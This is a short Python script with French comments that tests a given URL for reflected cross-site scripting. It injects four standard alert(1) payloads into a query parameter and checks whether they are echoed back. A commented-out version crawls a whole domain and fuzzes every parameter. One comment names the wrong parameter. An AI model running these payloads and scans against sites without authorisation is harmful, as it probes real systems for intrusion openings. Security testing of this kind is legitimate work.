### Vérification de faille XSS sur site

import requests

# Liste des payloads XSS simples
xss_payloads = [
    "<script>alert(1)</script>",
    "\"'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>"
]

def check_xss_vulnerability(url):
    print(f"Scanning URL : {url}")
    for payload in xss_payloads:
        # Envoie la requête avec le payload dans le paramètre 'q'
        target_url = f"{url}?download={payload}"
        response = requests.get(target_url)

        # Vérifie si le payload est présent dans la réponse
        if payload in response.text:
            print(f"Vulnérabilité XSS détectée avec le payload : {payload}")
        else:
            print(f"Aucune vulnérabilité détectée pour le payload : {payload}")

if __name__ == "__main__":
    target_url = input("Entrez l'URL à scanner (ex: http://example.com/search): ")
    check_xss_vulnerability(target_url)


# import requests
# from bs4 import BeautifulSoup
# import urllib.parse
#
# xss_payloads = [
#     "<script>alert(1)</script>",
#     "\"'><script>alert(1)</script>",
#     "<img src=x onerror=alert(1)>",
#     "<svg onload=alert(1)>"
# ]
#
# visited = set()
#
# def crawl_and_test(url, domain):
#     if url in visited:
#         return
#     visited.add(url)
#
#     # print(f"🌐 Exploration de : {url}")  # <= debug pour suivre le crawl
#
#     try:
#         response = requests.get(url, timeout=5)
#     except:
#         return
#
#     # Si le Content-Type n'est pas HTML, on saute
#     if "text/html" not in response.headers.get("Content-Type", ""):
#         return
#
#     # Test XSS sur les paramètres de cette URL
#     test_xss(url)
#
#     # Crawler les liens internes
#     try:
#         soup = BeautifulSoup(response.content, "lxml")  # parser plus tolérant
#     except Exception as e:
#         print(f"⚠️ Impossible d’analyser {url} : {e}")
#         return
#
#     for link in soup.find_all("a", href=True):
#         new_url = urllib.parse.urljoin(url, link["href"])
#         if domain in new_url:  # rester dans le même domaine
#             crawl_and_test(new_url, domain)
#
# def test_xss(url):
#     parsed = urllib.parse.urlparse(url)
#     params = urllib.parse.parse_qs(parsed.query)
#
#     # S'il n'y a pas de paramètres, on en crée un factice
#     if not params:
#         params = {"xss": ["test"]}
#
#     for param in params:
#         for payload in xss_payloads:
#             test_params = params.copy()
#             test_params[param] = payload
#             test_query = urllib.parse.urlencode(test_params, doseq=True)
#             test_url = urllib.parse.urlunparse(
#                 (parsed.scheme, parsed.netloc, parsed.path, parsed.params, test_query, parsed.fragment)
#             )
#
#             try:
#                 r = requests.get(test_url, timeout=5)
#                 if payload in r.text:
#                     print(f"💥 XSS détectée : {test_url} (paramètre {param})")
#                 elif urllib.parse.quote(payload) in r.text:
#                     print(f"⚠️ Potentielle XSS encodée : {test_url} (paramètre {param})")
#                 else:
#                     print(f"✅ Rien trouvé sur {test_url} (paramètre {param})")
#             except:
#                 pass
#
# if __name__ == "__main__":
#     target = input("Entrez une URL (ex: http://example.com/search): ")
#     domain = urllib.parse.urlparse(target).netloc
#     crawl_and_test(target, domain)